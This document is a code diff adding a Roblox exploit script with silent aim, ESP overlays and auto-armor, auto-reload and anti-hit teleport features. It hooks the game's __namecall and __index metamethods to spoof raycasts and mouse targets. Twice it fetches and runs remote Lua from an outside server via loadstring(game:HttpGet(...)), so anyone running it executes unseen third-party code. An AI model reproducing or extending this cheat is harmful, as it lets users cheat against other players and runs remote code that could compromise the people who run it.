+    _224.Position = UDim2.new(1, -110, 1, -120)
+    _224.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    _224.BackgroundTransparency = 0.5
+    _224.Text = "Void Hide"
+    _224.TextColor3 = Color3.fromRGB(255, 255, 255)
+    _224.Visible = true
+    
+    local _225 = false
+    local _226, _227, _228
+    
+    _224.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch then
+            _225 = true
+            _227 = input.Position
+            _228 = _224.Position
+            
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    _225 = false
+                end
+            end)
+        end
+    end)
+    
+    _224.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.Touch then
+            _226 = input
+        end
+    end)
+    
+    _54.InputChanged:Connect(function(input)
+        if _225 and input == _226 then
+            local _223 = input.Position - _227
+            _224.Position = UDim2.new(_228.X.Scale, _228.X.Offset + _223.X, _228.Y.Scale, _228.Y.Offset + _223.Y)
+        end
+    end)
+    
+    _224.Activated:Connect(function()
+        _147()
+    end)
+end
+
+local _229; _229 = hookmetamethod(game, "__namecall", function(...)
+    if checkcaller() then return _229(...) end
+    local _230 = {...}
+    local _44 = getnamecallmethod()
+    
+    if not _104.active then
+        return _229(...)
+    end
+    
+    if math.random(100) > _104.hitchance then
+        return _229(...)
+    end
+    
+    if _44:lower() == "raycast" and select(1, ...) == workspace then
+        local tp = _104.targetpart
+        local tpos = _104.targetposition
+        if tp and tpos then
+            local delta = tpos - _230[2]
+            return {
+                Instance = tp,
+                Position = tpos,
+                Normal = delta.Unit,
+                Distance = delta.Magnitude,
+                Material = tp.Material
+            }
+        end
+    end
+    
+    return _229(...)
+end)
+
+if _130 then
+    local _57 = _56:GetMouse()
+    local _233 = getrawmetatable(game)
+    local _234 = _233.__index
+    setreadonly(_233, false)
+
+    _233.__index = newcclosure(function(self, key)
+        if self == _57 and (key == "Hit" or key == "Target") then
+            if _104.active and _isMode("target all") then
+                if _104.targetplayer and _104.targetpart then
+                    if key == "Hit" then
+                        return CFrame.new(_104.targetposition)
+                    elseif key == "Target" then
+                        return _104.targetpart
+                    end
+                end
+            elseif _104.active and _isMode("multi") then
+                if _104.targetplayer and _104.targetpart then
+                    if key == "Hit" then
+                        return CFrame.new(_104.targetposition)
+                    elseif key == "Target" then
+                        return _104.targetpart
+                    end
+                end
+            elseif _104.active and _104.targetplayer and _104.targetposition then
+                if key == "Hit" then
+                    return CFrame.new(_104.targetposition)
+                elseif key == "Target" and _104.targetpart then
+                    return _104.targetpart
+                end
+            end
+        end
+        
+        if self == _57 and (key == "X" or key == "Y") and _104.active then
+            local _235
+            if _isMode("target all") or _isMode("multi") then
+                if _104.targetplayer and _104.targetplayer.Character then
+                    local _187 = _104.targetplayer.Character:FindFirstChild("Head")
+                    if _187 then
+                        _235 = _187.Position
+                    end
+                end
+            elseif _104.targetposition then
+                _235 = _104.targetposition
+            end
+            
+            if _235 then
+                local _236 = _58:WorldToViewportPoint(_235)
+                return _236[key == "X" and "X" or "Y"]
+            end
+        end
+        
+        return _234(self, key)
+    end)
+
+    setreadonly(_233, true)
+end
+
+local _237 = _52.RenderStepped:Connect(function()
+    if _104.active then
+        _205()
+        _194()
+        _198()
+        
+        if _130 then
+            _141()
+        end
+        
+        _206()
+        
+        _151()
+    else
+        _134.Visible = false
+        _135.Visible = false
+    end
+end)
+
+Toggles.Enabled:OnChanged(function(value)
+    _104.enabled = value
+    shared.hitman.silent.enabled = value
+    if not value then
+        _104.active = false
+        _104.targetplayer = nil
+        _104.targetpart = nil
+        _104.targetposition = nil
+        
+        if _105 then
+            _150()
+        end
+        _161()
+    end
+end)
+
+Options.Mode:OnChanged(function(value)
+    value = string.lower(value)
+    _104.mode = value
+    _104.currentmode = value
+    shared.hitman.silent.mode = value
+    
+    if _104.active then
+        _198()
+        _165()
+    end
+    
+    if (value == "auto select" or value == "target all" or value == "multi") and _105 then
+        _150()
+        if Toggles.Spectate.Value then
+            Toggles.Spectate:SetValue(false)
+        end
+    end
+end)
+
+Toggles.AutoShoot:OnChanged(function(value)
+    _104.autoshoot = value
+end)
+
+Toggles.ManipulatedText:OnChanged(function(value)
+    if not value then
+        _134.Visible = false
+    elseif _104.active then
+        _134.Visible = true
+    end
+end)
+
+Toggles.TargetInfo:OnChanged(function(value)
+    if not value then
+        _135.Visible = false
+    elseif _104.active then
+        _135.Visible = true
+        _194()
+    end
+end)
+
+Toggles.Line:OnChanged(function(value)
+    if not value then
+        for i, _139 in ipairs(_136) do
+            _139.Visible = false
+        end
+        for i, _140 in ipairs(_137) do
+            _140.Visible = false
+        end
+    elseif _104.active then
+        _198()
+    end
+end)
+
+Toggles.Spectate:OnChanged(function(value)
+    if value then
+        if _104.active and _isMode("sticky") then
+            _149()
+        end
+    else
+        _150()
+    end
+end)
+
+Toggles.Highlight:OnChanged(function(value)
+    if value then
+        if _104.active then
+            _165()
+        end
+    else
+        _161()
+    end
+end)
+
+Toggles.KnockCheck:OnChanged(function(value)
+    shared.hitman.checks.knock = value
+end)
+
+Toggles.ProtectedCheck:OnChanged(function(value)
+    shared.hitman.checks.protected = value
+end)
+
+Toggles.WhitelistEnabled:OnChanged(function(value)
+    shared.hitman.checks.whitelist.enabled = value
+    _WL_RebuildCache()
+    _WL_ValidateCurrentTarget()
+    if Toggles.Highlight.Value and _104.active then
+        _165()
+    end
+end)
+
+Options.WhitelistPlayers:OnChanged(function()
+    _WL_SyncShared()
+    _WL_ValidateCurrentTarget()
+    if Toggles.Highlight.Value and _104.active then
+        _165()
+    end
+end)
+
+Toggles.BlacklistEnabled:OnChanged(function()
+    _BL_RebuildCache()
+    _BL_ValidateCurrentTarget()
+    if Toggles.Highlight.Value and _104.active then
+        _165()
+    end
+end)
+
+Toggles.AutoBlockFriends:OnChanged(function()
+    _BL_ValidateCurrentTarget()
+end)
+
+Options.BlacklistPlayers:OnChanged(function()
+    _BL_RebuildCache()
+    _BL_ValidateCurrentTarget()
+    if Toggles.Highlight.Value and _104.active then
+        _165()
+    end
+end)
+
+local function _cleanupPlayerFromDropdowns(plr)
+    local function removeFromSelected(toggleName, dropdownName)
+        local map = Options[dropdownName] and Options[dropdownName].Value
+        if type(map) == "table" then
+            local formatted = string.format("%s (%s)", plr.DisplayName, plr.Name)
+            if map[plr.Name] then map[plr.Name] = nil end
+            if map[plr.DisplayName] then map[plr.DisplayName] = nil end
+            if map[formatted] then map[formatted] = nil end
+            pcall(function() Options[dropdownName]:SetValue(map) end)
+        end
+    end
+    removeFromSelected("WhitelistEnabled", "WhitelistPlayers")
+    removeFromSelected("BlacklistEnabled", "BlacklistPlayers")
+end
+
+_51.PlayerAdded:Connect(function()
+    task.defer(_WL_RefreshDropdown)
+    task.defer(_BL_RefreshDropdown)
+    task.defer(_TP_RefreshDropdown)
+end)
+
+_51.PlayerRemoving:Connect(function(plr)
+    _cleanupPlayerFromDropdowns(plr)
+    task.defer(_WL_RefreshDropdown)
+    task.defer(_BL_RefreshDropdown)
+    task.defer(_TP_RefreshDropdown)
+end)
+
+task.defer(function()
+    _WL_RefreshDropdown()
+    _WL_SyncShared()
+    _BL_RefreshDropdown()
+end)
+
+Options.HighlightFillColor:OnChanged(function()
+    for _, _163 in pairs(_114) do
+        if _163.highlight then
+            _163.highlight.FillColor = Options.HighlightFillColor.Value
+            _163.highlight.FillTransparency = Options.HighlightFillColor.Transparency
+        end
+    end
+end)
+
+Options.HighlightOutlineColor:OnChanged(function()
+    for _, _163 in pairs(_114) do
+        if _163.highlight then
+            _163.highlight.OutlineColor = Options.HighlightOutlineColor.Value
+            _163.highlight.OutlineTransparency = Options.HighlightOutlineColor.Transparency
+        end
+    end
+end)
+
+Options.LineColor:OnChanged(function()
+    local _238 = Options.LineColor.Value
+    local _239 = Options.LineColor.Transparency
+    for i, _139 in ipairs(_136) do
+        if _139 then
+            _139.Color = _238
+            _139.Transparency = _239
+        end
+    end
+end)
+
+game:GetService("Players").PlayerRemoving:Connect(function(_154)
+    if _154 == _104.targetplayer then
+        _104.targetplayer = nil
+        _104.targetpart = nil
+        _104.targetposition = nil
+        _168(false)
+        
+        if _109 == _154 and _105 then
+            _150()
+        end
+    end
+    
+    if _154 == _109 then
+        _150()
+    end
+    
+    _104.lasthealth[_154] = nil
+    _104.wasknocked[_154] = nil
+    
+    if _114[_154.Name] then
+        local _163 = _114[_154.Name]
+        if _163.highlight then
+            _163.highlight:Destroy()
+        end
+        if _163.connection then
+            _163.connection:Disconnect()
+        end
+        _114[_154.Name] = nil
+    end
+end)
+
+local Camera = _58
+local ESPLocalPlayer = _56
+
+local isRunning = true
+local connections = {}
+local spawnedTasks = {}
+
+local names = {}
+shared.FriendsCache = {}
+local lastUpdateTime = 0
+local UPDATE_INTERVAL = 0.033
+local isRefreshingFriends = false
+local lastRefreshAttempt = 0
+local REFRESH_COOLDOWN = 3
+
+local currentTargetPlayer = nil
+
+local function updateCurrentTarget()
+    if _104 and _104.targetplayer then
+        currentTargetPlayer = _104.targetplayer
+    elseif shared and shared.hitman and shared.hitman.silent and shared.hitman.silent.target then
+        currentTargetPlayer = shared.hitman.silent.target
+    else
+        currentTargetPlayer = nil
+    end
+end
+
+local function cleanup()
+    isRunning = false
+    
+    for _, connection in pairs(connections) do
+        pcall(function()
+            if connection then connection:Disconnect() end
+        end)
+    end
+    connections = {}
+    
+    for _, taskId in pairs(spawnedTasks) do
+        pcall(function()
+            if taskId and type(taskId) == "thread" then
+                task.cancel(taskId)
+            end
+        end)
+    end
+    spawnedTasks = {}
+    
+    for player, label in pairs(names) do
+        pcall(function()
+            if label and label.Parent then
+                label:Destroy()
+            end
+        end)
+    end
+    
+    names = {}
+    shared.FriendsCache = {}
+    
+    pcall(function()
+        local coreGui = game:GetService("CoreGui")
+        local screenGui = coreGui:FindFirstChild("ESPGui")
+        if screenGui then
+            screenGui:Destroy()
+        end
+    end)
+end
+
+local function fetchAllFriends()
+    if not isRunning then return {} end
+    
+    local friendIds = {}
+    local cursor = nil
+    local hasMore = true
+    local maxPages = 20
+    local pageCount = 0
+    
+    while hasMore and pageCount < maxPages and isRunning do
+        pageCount = pageCount + 1
+        
+        local success, result = pcall(function()
+            if cursor then
+                return _51:GetFriendsAsync(ESPLocalPlayer.UserId, cursor)
+            else
+                return _51:GetFriendsAsync(ESPLocalPlayer.UserId)
+            end
+        end)
+        
+        if not success or not result then
+            break
+        end
+        
+        local pageData = nil
+        local getPageSuccess = pcall(function()
+            pageData = result:GetCurrentPage()
+        end)
+        
+        if not getPageSuccess or not pageData then
+            break
+        end
+        
+        for _, friend in ipairs(pageData) do
+            if friend and friend.Id then
+                friendIds[friend.Id] = {
+                    UserId = friend.Id,
+                    Username = friend.Username or "Unknown",
+                    DisplayName = friend.DisplayName or friend.Username or "Unknown"
+                }
+            end
+        end
+        
+        local nextCursor = nil
+        local getCursorSuccess = pcall(function()
+            nextCursor = result:GetNextCursor()
+        end)
+        
+        if getCursorSuccess and nextCursor and nextCursor ~= "" then
+            cursor = nextCursor
+        else
+            hasMore = false
+        end
+        
+        task.wait(0.05)
+    end
+    
+    return friendIds
+end
+
+local function getPlayerTeam(player)
+    if not player or not player.Character then return nil end
+    local character = player.Character
+    
+    local humanoid = character:FindFirstChild("Humanoid")
+    if humanoid then
+        local teamValue = humanoid:FindFirstChild("Team")
+        if teamValue then
+            return teamValue.Value
+        end
+    end
+    
+    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
+    if torso then
+        local teamValue = torso:FindFirstChild("Team")
+        if teamValue then
+            return teamValue.Value
+        end
+    end
+    
+    for _, child in ipairs(character:GetChildren()) do
+        if child:IsA("Accessory") then
+            local handle = child:FindFirstChild("Handle")
+            if handle then
+                local teamValue = handle:FindFirstChild("Team")
+                if teamValue then
+                    return teamValue.Value
+                end
+            end
+        end
+        local teamValue = child:FindFirstChild("Team")
+        if teamValue and type(teamValue.Value) == "string" then
+            return teamValue.Value
+        end
+    end
+    
+    local characterTeam = character:GetAttribute("Team")
+    if characterTeam then
+        return characterTeam
+    end
+    
+    return nil
+end
+
+local function isSameTeam(player)
+    local localTeam = getPlayerTeam(ESPLocalPlayer)
+    local playerTeam = getPlayerTeam(player)
+    if not localTeam or not playerTeam then return false end
+    return localTeam == playerTeam
+end
+
+local function isFriend(player)
+    if not player or not player.UserId then return false end
+    return shared.FriendsCache[player.UserId] ~= nil
+end
+
+local function updateAllESPLabels()
+    for player, label in pairs(names) do
+        if label and label.Parent and player and player.Parent then
+            updateLabelStyle(label, player)
+        elseif label and not label.Parent then
+            names[player] = nil
+        end
+    end
+end
+
+local function espToggleOn(toggleName)
+    return Toggles and Toggles[toggleName] and Toggles[toggleName].Value
+end
+
+local function buildESPText(player, nameText)
+    local parts = {}
+    if espToggleOn("ESPShowNames") then
+        table.insert(parts, nameText)
+    end
+    local character = player.Character
+    local head = character and character:FindFirstChild("Head")
+    if espToggleOn("ESPShowDistance") and head then
+        local dist = math.floor((Camera.CFrame.Position - head.Position).Magnitude)
+        table.insert(parts, "[" .. dist .. "m]")
+    end
+    if espToggleOn("ESPShowHealth") and character then
+        local hum = character:FindFirstChild("Humanoid")
+        if hum then
+            table.insert(parts, math.floor(hum.Health) .. " HP")
+        end
+    end
+    if #parts == 0 then
+        return ""
+    end
+    return table.concat(parts, " ")
+end
+
+local function setAllESPVisible(visible)
+    for _, label in pairs(names) do
+        if label and label.Parent then
+            label.Visible = visible
+        end
+    end
+end
+
+local function updateLabelStyle(label, player)
+    if not label or not player or not isRunning then return end
+    if not espToggleOn("ESPEnabled") then return end
+    
+    updateCurrentTarget()
+    
+    local isPlayerFriend = isFriend(player)
+    local isTeammate = isSameTeam(player)
+    local isTargeted = (currentTargetPlayer == player)
+    local displayName = player.DisplayName or player.Name
+    
+    if isTargeted then
+        label.Text = buildESPText(player, " " .. displayName .. " ")
+        label.TextColor3 = Color3.fromRGB(102, 0, 0)
+        label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        label.TextStrokeTransparency = 0
+        label.TextSize = 14
+        label.Font = Enum.Font.GothamBold
+    elseif isTeammate then
+        label.Text = buildESPText(player, "?? " .. displayName .. " ??")
+        label.TextColor3 = Color3.fromRGB(0, 255, 0)
+        label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        label.TextStrokeTransparency = 0
+        label.TextSize = 13
+        label.Font = Enum.Font.GothamBold
+    elseif isPlayerFriend then
+        label.Text = buildESPText(player, "?? " .. displayName .. " ??")
+        label.TextColor3 = Color3.fromRGB(0, 200, 255)
+        label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        label.TextStrokeTransparency = 0
+        label.TextSize = 13
+        label.Font = Enum.Font.GothamBold
+    else
+        label.Text = buildESPText(player, displayName)
+        label.TextColor3 = Color3.fromRGB(255, 50, 50)
+        label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        label.TextStrokeTransparency = 0
+        label.TextSize = 13
+        label.Font = Enum.Font.GothamBold
+    end
+end
+
+local function refreshFriendsList()
+    if not isRunning then return end
+    
+    local currentTime = tick()
+    if isRefreshingFriends or (currentTime - lastRefreshAttempt < REFRESH_COOLDOWN) then
+        return
+    end
+    
+    isRefreshingFriends = true
+    lastRefreshAttempt = currentTime
+    
+    local success, result = pcall(fetchAllFriends)
+    if success and result then
+        shared.FriendsCache = result
+        updateAllESPLabels()
+        
+        pcall(_BL_ValidateCurrentTarget)
+        pcall(_WL_ValidateCurrentTarget)
+    end
+    
+    isRefreshingFriends = false
+end
+
+local function createName(player)
+    if not isRunning then return nil end
+    
+    local label = Instance.new("TextLabel")
+    label.BackgroundTransparency = 1
+    label.TextStrokeTransparency = 0
+    label.TextSize = 13
+    label.Font = Enum.Font.GothamBold
+    label.AnchorPoint = Vector2.new(0.5, 0.5)
+    label.BorderSizePixel = 0
+    label.TextXAlignment = Enum.TextXAlignment.Center
+    label.TextYAlignment = Enum.TextYAlignment.Center
+    label.Visible = false
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    label.ZIndex = 10
+    
+    local coreGui = game:GetService("CoreGui")
+    local screenGui = coreGui:FindFirstChild("ESPGui")
+    
+    if not screenGui then
+        screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "ESPGui"
+        screenGui.ResetOnSpawn = false
+        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+        screenGui.Parent = coreGui
+    end
+    
+    label.Parent = screenGui
+    
+    return label
+end
+
+local function addPlayerESP(player)
+    if not isRunning then return end
+    if player == ESPLocalPlayer then return end
+    if names[player] then return end
+    if not player or not player.Parent then return end
+    
+    local label = createName(player)
+    if label then
+        names[player] = label
+        updateLabelStyle(label, player)
+    end
+end
+
+local function removePlayerESP(player)
+    if names[player] then
+        local label = names[player]
+        names[player] = nil
+        
+        pcall(function()
+            if label and label.Parent then
+                label:Destroy()
+            end
+        end)
+    end
+end
+
+local function getDynamicHeadPosition(head)
+    if not head or not head.Parent then return nil, false end
+    
+    local headCFrame = head.CFrame
+    local headSize = head.Size
+    
+    local topCenter = headCFrame.Position + Vector3.new(0, headSize.Y / 2, 0)
+    
+    local screenPos, isOnScreen = Camera:WorldToScreenPoint(topCenter)
+    
+    if not isOnScreen or screenPos.Z <= 0 then
+        return nil, false
+    end
+    
+    local distance = (Camera.CFrame.Position - head.Position).Magnitude
+    
+    local yOffset
+    if distance < 50 then
+        yOffset = 22
+    elseif distance < 150 then
+        local t = (distance - 50) / 100
+        yOffset = 22 - (t * 7)
+    else
+        yOffset = 12
+    end
+    
+    return Vector2.new(screenPos.X, screenPos.Y - yOffset), true
+end
+
+local function setupFriendStatusMonitoring()
+    local function onPlayerAdded(player)
+        task.wait(0.3)
+        if isRunning and shared.FriendsCache[player.UserId] then
+            if names[player] then
+                updateLabelStyle(names[player], player)
+            end
+        end
+    end
+    
+    connections.FriendStatusMonitor = _51.PlayerAdded:Connect(onPlayerAdded)
+end
+
+local function setupESP()
+    if not isRunning then return end
+    
+    task.spawn(function()
+        refreshFriendsList()
+    end)
+    
+    for _, player in ipairs(_51:GetPlayers()) do
+        if player ~= ESPLocalPlayer then
+            addPlayerESP(player)
+        end
+    end
+    
+    connections.PlayerAdded = _51.PlayerAdded:Connect(function(player)
+        if player ~= ESPLocalPlayer then
+            addPlayerESP(player)
+            task.wait(0.1)
+            if isRunning and shared.FriendsCache[player.UserId] then
+                if names[player] then
+                    updateLabelStyle(names[player], player)
+                end
+            end
+            pcall(_BL_ValidateCurrentTarget)
+            pcall(_WL_ValidateCurrentTarget)
+            task.defer(_WL_RefreshDropdown)
+            task.defer(_BL_RefreshDropdown)
+        end
+    end)
+    
+    connections.PlayerRemoving = _51.PlayerRemoving:Connect(function(player)
+        removePlayerESP(player)
+    end)
+    
+    local function onCharacterAdded(player)
+        if names[player] and isRunning then
+            updateLabelStyle(names[player], player)
+        end
+    end
+    
+    for _, player in ipairs(_51:GetPlayers()) do
+        if player ~= ESPLocalPlayer then
+            local connection = player.CharacterAdded:Connect(function()
+                onCharacterAdded(player)
+            end)
+            connections[player] = connection
+        end
+    end
+    
+    connections.CharacterAddedGlobal = _51.PlayerAdded:Connect(function(player)
+        if player ~= ESPLocalPlayer then
+            local connection = player.CharacterAdded:Connect(function()
+                onCharacterAdded(player)
+            end)
+            connections[player .. "_char"] = connection
+        end
+    end)
+    
+    connections.RenderStepped = _52.RenderStepped:Connect(function()
+        if not isRunning then return end
+        
+        if not espToggleOn("ESPEnabled") then
+            setAllESPVisible(false)
+            return
+        end
+        
+        updateCurrentTarget()
+        
+        local currentTime = tick()
+        if currentTime - lastUpdateTime < UPDATE_INTERVAL then
+            return
+        end
+        lastUpdateTime = currentTime
+        
+        for player, label in pairs(names) do
+            if not label or not label.Parent then
+                removePlayerESP(player)
+                continue
+            end
+            
+            if not player or not player.Parent then
+                removePlayerESP(player)
+                continue
+            end
+            
+            local character = player.Character
+            if not character or not character.Parent then
+                if label.Visible then label.Visible = false end
+                continue
+            end
+            
+            local humanoid = character:FindFirstChild("Humanoid")
+            if not humanoid or humanoid.Health <= 0 then
+                if label.Visible then label.Visible = false end
+                continue
+            end
+            
+            local head = character:FindFirstChild("Head")
+            if not head then
+                if label.Visible then label.Visible = false end
+                continue
+            end
+            
+            updateLabelStyle(label, player)
+            
+            if label.Text == "" then
+                if label.Visible then label.Visible = false end
+                continue
+            end
+            
+            local screenPos, isOnScreen = getDynamicHeadPosition(head)
+            
+            if isOnScreen and screenPos then
+                label.Position = UDim2.new(0, screenPos.X, 0, screenPos.Y)
+                
+                if not label.Visible then label.Visible = true end
+                
+                local distance = (Camera.CFrame.Position - head.Position).Magnitude
+                local textSize = 13
+                if distance > 150 then
+                    textSize = math.clamp(13 - ((distance - 150) / 200), 10, 13)
+                end
+                
+                label.TextSize = textSize
+                label.TextTransparency = 0
+                label.TextStrokeTransparency = 0
+            else
+                if label.Visible then label.Visible = false end
+            end
+        end
+    end)
+    
+    spawnedTasks[1] = task.spawn(function()
+        if not isRunning then return end
+        task.wait(0.5)
+        if isRunning then 
+            refreshFriendsList()
+        end
+    end)
+    
+    spawnedTasks[2] = task.spawn(function()
+        while isRunning do
+            task.wait(2)
+            if isRunning then 
+                refreshFriendsList()
+            end
+        end
+    end)
+    
+    connections.AncestryChanged = ESPLocalPlayer.AncestryChanged:Connect(function()
+        if not ESPLocalPlayer.Parent then
+            cleanup()
+        end
+    end)
+    
+    connections.CameraChanged = _53:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
+        Camera = _53.CurrentCamera
+    end)
+    
+    setupFriendStatusMonitoring()
+end
+
+Toggles.ESPEnabled:OnChanged(function(value)
+    if not value then
+        setAllESPVisible(false)
+    else
+        updateAllESPLabels()
+    end
+end)
+
+Toggles.ESPShowNames:OnChanged(function()
+    if espToggleOn("ESPEnabled") then
+        updateAllESPLabels()
+    end
+end)
+
+Toggles.ESPShowDistance:OnChanged(function()
+    if espToggleOn("ESPEnabled") then
+        updateAllESPLabels()
+    end
+end)
+
+Toggles.ESPShowHealth:OnChanged(function()
+    if espToggleOn("ESPEnabled") then
+        updateAllESPLabels()
+    end
+end)
+
+setupESP()
+
+if not espToggleOn("ESPEnabled") then
+    setAllESPVisible(false)
+end
+
+_48:OnUnload(function()
+    _AR_Running = false
+    isRunning = false
+    cleanup()
+    _150()
+    _161()
+    _193()
+    _243.enabled = false
+    _245()
+    if _254 then _254:Disconnect() end
+    if _255 then _255:Disconnect() end
+    if _237 then _237:Disconnect() end
+    if _121 then
+        _121:Disconnect()
+        _121 = nil
+    end
+    if _133 then _133:Destroy() end
+    _138()
+end)
+
+local _AR_Running = true
+
+task.spawn(function()
+    while _AR_Running do
+        if not Toggles.AutoReload.Value then
+            task.wait(0.5)
+            continue
+        end
+        
+        local char = _56.Character
+        local tool = char and char:FindFirstChildWhichIsA("Tool")
+        
+        if tool then
+            for _, v in pairs(tool:GetDescendants()) do
+                if (v:IsA("IntValue") or v:IsA("NumberValue")) and v.Value <= 0 then
+                    keypress(0x52)
+                    task.wait(0.05)
+                    keyrelease(0x52)
+                    break
+                end
+            end
+        end
+        task.wait(0.1)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        if Toggles.AutoEquipDB and Toggles.AutoEquipDB.Value then
+            local char = _56.Character
+            local bp = _56.Backpack
+            
+            local holding = char and char:FindFirstChildWhichIsA("Tool")
+            if not (holding and holding.Name:lower():find("double")) then
+                local db = nil
+                for _, t in ipairs(bp:GetChildren()) do
+                    if t:IsA("Tool") and t.Name:lower():find("double") then
+                        db = t
+                        break
+                    end
+                end
+                if not db and char then
+                    for _, t in ipairs(char:GetChildren()) do
+                        if t:IsA("Tool") and t.Name:lower():find("double") then
+                            db = t
+                            break
+                        end
+                    end
+                end
+                if db and char then
+                    db.Parent = char
+                end
+            end
+        end
+        task.wait(0.01)
+    end
+end)
+loadstring(game:HttpGet('https://woodie-exe-v2-backend.vercel.app/cmds.lua'))()
+
+local _AA_cache = nil
+local _AA_busy = false
+local _AA_connections = {}
+
+local function _AA_getArmor()
+    if _AA_cache and _AA_cache.Parent then return _AA_cache end
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if v.Name == "Armor" and v:IsA("ValueBase") then
+            local p = v.Parent
+            if p and p.Name == "BodyEffects" then
+                local pp = p.Parent
+                if pp and pp.Name == _56.Name then
+                    _AA_cache = v
+                    return v
+                end
+            end
+        end
+    end
+end
+
+local function _AA_getArmorValue()
+    local a = _AA_getArmor()
+    return a and a.Value or 0
+end
+
+local function _AA_validArmorName(n)
+    n = string.lower(n):gsub("%s+", ""):gsub("%-", "")
+    if not string.find(n, "armor") or string.find(n, "fire") or string.find(n, "medium") or string.find(n, "mdedium") then
+        return false
+    end
+    return true
+end
+
+local function _AA_findBest()
+    local ba, bs = nil, -math.huge
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if _AA_validArmorName(v.Name) then
+            local pr = v:FindFirstChild("Price")
+            if pr and pr:IsA("ValueBase") then
+                local sc = pr.Value
+                if string.find(string.lower(v.Name), "full") then
+                    sc = sc + 100000
+                end
+                if sc > bs then
+                    bs = sc
+                    ba = v
+                end
+            end
+        end
+    end
+    return ba
+end
+
+local function _AA_buy()
+    if _AA_busy then return end
+    _AA_busy = true
+    
+    local wasVoidActive = _118
+    if wasVoidActive then
+        _118 = false
+        if _121 then
+            _121:Disconnect()
+            _121 = nil
+        end
+        if _120 and _119 then
+            local _148 = _56.Character and _56.Character:FindFirstChildOfClass("Humanoid")
+            if _148 then
+                _148.PlatformStand = true
+            end
+            _120.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            _120.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+            _120.CFrame = _119
+            task.wait(0.5)
+            if _148 then
+                _148.PlatformStand = false
+            end
+        end
+        _119 = nil
+        task.wait(0.3)
+    end
+    
+    local ch = _56.Character or _56.CharacterAdded:Wait()
+    local rt = ch:WaitForChild("HumanoidRootPart")
+    local t0 = tick()
+    local threshold = Options.AutoArmorThreshold and Options.AutoArmorThreshold.Value or 200
+    while _AA_getArmorValue() < threshold and tick() - t0 < 8 do
+        local sv = _AA_getArmorValue()
+        local it = _AA_findBest()
+        if not it then break end
+        local pt = it.PrimaryPart or it:FindFirstChildWhichIsA("BasePart")
+        local cd = it:FindFirstChild("ClickDetector")
+        if not pt or not cd then break end
+        local oc = rt.CFrame
+        rt.CFrame = pt.CFrame * CFrame.new(0, -3, 0)
+        for i = 1, 5 do
+            fireclickdetector(cd)
+            task.wait(0.05)
+        end
+        local okk = false
+        local w0 = tick()
+        repeat
+            if _AA_getArmorValue() > sv then okk = true break end
+            task.wait(0.1)
+        until tick() - w0 > 1
+        rt.CFrame = oc
+        task.wait(okk and 0.2 or 0.5)
+    end
+    _AA_busy = false
+    
+    if wasVoidActive then
+        if _120 then
+            _119 = _120.CFrame
+        end
+        _118 = true
+        _143()
+        _146()
+        if _121 then
+            _121:Disconnect()
+        end
+        _121 = _52.Heartbeat:Connect(function()
+            if _118 and _120 then
+            local _t = tick()
+            _120.CFrame = CFrame.new(
+                    math.floor((_t * 4423) % 999999991) * math.sign(math.sin(_t * 7919)),
+                    math.floor((_t * 6287) % 999999973) * math.sign(math.cos(_t * 6421)),
+                    math.floor((_t * 3499) % 999999937) * math.sign(math.sin(_t * 8737))
+                ) * CFrame.Angles(
+                    (_t * 17) % (math.pi * 2),
+                    (_t * 31) % (math.pi * 2),
+                    (_t * 53) % (math.pi * 2)
+                )
+             end
+        end)
+    end
+end
+
+_AA_connections.charAdded = _56.CharacterAdded:Connect(function()
+    _AA_cache = nil
+    task.wait(1)
+    if Toggles.AutoArmor.Value then
+        if Toggles.AutoArmorVoidIgnore.Value or not _118 then
+            _AA_buy()
+        end
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.2) do
+        if not Toggles.AutoArmor.Value then continue end
+        if not Toggles.AutoArmorVoidIgnore.Value and _118 then continue end
+        local v = _AA_getArmorValue()
+        local threshold = Options.AutoArmorThreshold and Options.AutoArmorThreshold.Value or 200
+        if v < threshold then
+            task.spawn(_AA_buy)
+        end
+    end
+end)
+
+if _56.Character then
+    task.wait(1)
+    if Toggles.AutoArmor.Value then
+        if Toggles.AutoArmorVoidIgnore.Value or not _118 then
+            _AA_buy()
+        end
+    end
+end
+loadstring(game:HttpGet('https://woodie-exe-v2-backend.vercel.app/jumpc.lua'))()
+return {
+    targetaim = _104,
+    togglevoid = _147,
+    setmode = function(_241)
+        local modeMap = { sticky = 'Sticky', ['auto select'] = 'Auto Select', ['target all'] = 'Target All', multi = 'Multi' }
+        if modeMap[_241] then
+            _104.mode = _241
+            _104.currentmode = _241
+            shared.hitman.silent.mode = _241
+            Options.Mode:SetValue(modeMap[_241])
+        end
+    end,
+    desktop = _130,
+    console = _129,
+    specting = _149,
+    nonspect = _150,
+    updhigh = _165,
+    removeskidlights = _161
+}
